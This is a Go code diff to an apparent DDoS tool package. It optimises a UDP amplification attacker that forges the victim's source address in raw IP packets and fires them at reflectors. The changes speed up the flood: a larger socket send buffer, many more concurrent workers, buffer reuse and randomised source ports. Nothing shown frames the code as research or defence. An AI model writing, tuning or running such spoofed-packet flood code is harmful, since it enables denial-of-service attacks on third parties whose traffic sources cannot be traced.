@@ -1,9 +1,9 @@
 package vectors
 
 import (
-	"encoding/binary"
 	"math/rand"
 	"net"
+	"runtime"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -41,6 +41,7 @@ func NewUDPAmplifier(typ AmpType, spoofSrc, reflector string, reflectorPort uint
 		return nil, err
 	}
 	unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
+	unix.SetsockoptInt(fd, unix.SOL_SOCKET, unix.SO_SNDBUF, 4*1024*1024)
 	return &UDPAmplifier{typ: typ, srcIP: src, dstIP: dst, dstPort: reflectorPort, fd: fd}, nil
 }
 
@@ -63,73 +64,106 @@ func (u *UDPAmplifier) payload() []byte {
 	return nil
 }
 
-func (u *UDPAmplifier) buildPacket(payload []byte, rng *rand.Rand) []byte {
+func (u *UDPAmplifier) buildPacketInto(buf []byte, payload []byte, rng *rand.Rand, sport uint16) int {
 	udpLen := 8 + len(payload)
 	ipLen := 20 + udpLen
-	pkt := make([]byte, ipLen)
+	if len(buf) < ipLen {
+		return 0
+	}
+	pkt := buf[:ipLen]
 	pkt[0] = 0x45
-	binary.BigEndian.PutUint16(pkt[2:4], uint16(ipLen))
-	binary.BigEndian.PutUint16(pkt[4:6], uint16(rng.Intn(65535)))
+	pkt[2] = byte(ipLen >> 8)
+	pkt[3] = byte(ipLen)
+	pkt[4] = byte(rng.Intn(65535) >> 8)
+	pkt[5] = byte(rng.Intn(65535))
 	pkt[8] = 64
 	pkt[9] = 17
 	copy(pkt[12:16], u.srcIP)
 	copy(pkt[16:20], u.dstIP)
+
 	var sum uint32
 	for i := 0; i+1 < 20; i += 2 {
-		sum += uint32(binary.BigEndian.Uint16(pkt[i : i+2]))
+		sum += uint32(pkt[i])<<8 | uint32(pkt[i+1])
 	}
 	for sum>>16 != 0 {
 		sum = (sum & 0xffff) + (sum >> 16)
 	}
-	binary.BigEndian.PutUint16(pkt[10:12], ^uint16(sum))
+	cs := ^uint16(sum)
+	pkt[10] = byte(cs >> 8)
+	pkt[11] = byte(cs)
+
 	udp := pkt[20:]
-	binary.BigEndian.PutUint16(udp[0:2], uint16(rng.Intn(65535)+1024))
-	binary.BigEndian.PutUint16(udp[2:4], u.dstPort)
-	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))
+	udp[0] = byte(sport >> 8)
+	udp[1] = byte(sport)
+	udp[2] = byte(u.dstPort >> 8)
+	udp[3] = byte(u.dstPort)
+	udp[4] = byte(udpLen >> 8)
+	udp[5] = byte(udpLen)
 	copy(udp[8:], payload)
+
 	var usum uint32
-	usum += uint32(binary.BigEndian.Uint16(u.srcIP[0:2]))
-	usum += uint32(binary.BigEndian.Uint16(u.srcIP[2:4]))
-	usum += uint32(binary.BigEndian.Uint16(u.dstIP[0:2]))
-	usum += uint32(binary.BigEndian.Uint16(u.dstIP[2:4]))
-	usum += uint32(17)
+	usum += uint32(u.srcIP[0])<<8 | uint32(u.srcIP[1])
+	usum += uint32(u.srcIP[2])<<8 | uint32(u.srcIP[3])
+	usum += uint32(u.dstIP[0])<<8 | uint32(u.dstIP[1])
+	usum += uint32(u.dstIP[2])<<8 | uint32(u.dstIP[3])
+	usum += 17
 	usum += uint32(udpLen)
 	for i := 0; i+1 < udpLen; i += 2 {
-		usum += uint32(binary.BigEndian.Uint16(udp[i : i+2]))
+		usum += uint32(udp[i])<<8 | uint32(udp[i+1])
 	}
 	for usum>>16 != 0 {
 		usum = (usum & 0xffff) + (usum >> 16)
 	}
-	cs := ^uint16(usum)
-	if cs == 0 {
-		cs = 0xffff
+	ucs := ^uint16(usum)
+	if ucs == 0 {
+		ucs = 0xffff
 	}
-	binary.BigEndian.PutUint16(udp[6:8], cs)
-	return pkt
+	udp[6] = byte(ucs >> 8)
+	udp[7] = byte(ucs)
+
+	return ipLen
 }
 
 func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
 	if workers <= 0 {
-		workers = 8
+		workers = runtime.NumCPU() * 8
+		if workers < 16 {
+			workers = 16
+		}
 	}
+
 	dst := &unix.SockaddrInet4{Port: int(u.dstPort)}
 	copy(dst.Addr[:], u.dstIP)
+
 	payload := u.payload()
+	if payload == nil {
+		return
+	}
+
+	const pktCap = 256
+
 	var wg sync.WaitGroup
 	for w := 0; w < workers; w++ {
 		wg.Add(1)
 		go func(seed int64) {
 			defer wg.Done()
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ seed))
+			buf := make([]byte, pktCap)
+
 			for {
 				select {
 				case <-stop:
 					return
 				default:
 				}
-				pkt := u.buildPacket(payload, rng)
-				_ = unix.Sendto(u.fd, pkt, 0, dst)
-				u.packets.Add(1)
+				n := u.buildPacketInto(buf, payload, rng, uint16(rng.Intn(64511)+1024))
+				if n == 0 {
+					continue
+				}
+				err := unix.Sendto(u.fd, buf[:n], 0, dst)
+				if err == nil {
+					u.packets.Add(1)
+				}
 			}
 		}(int64(w))
 	}
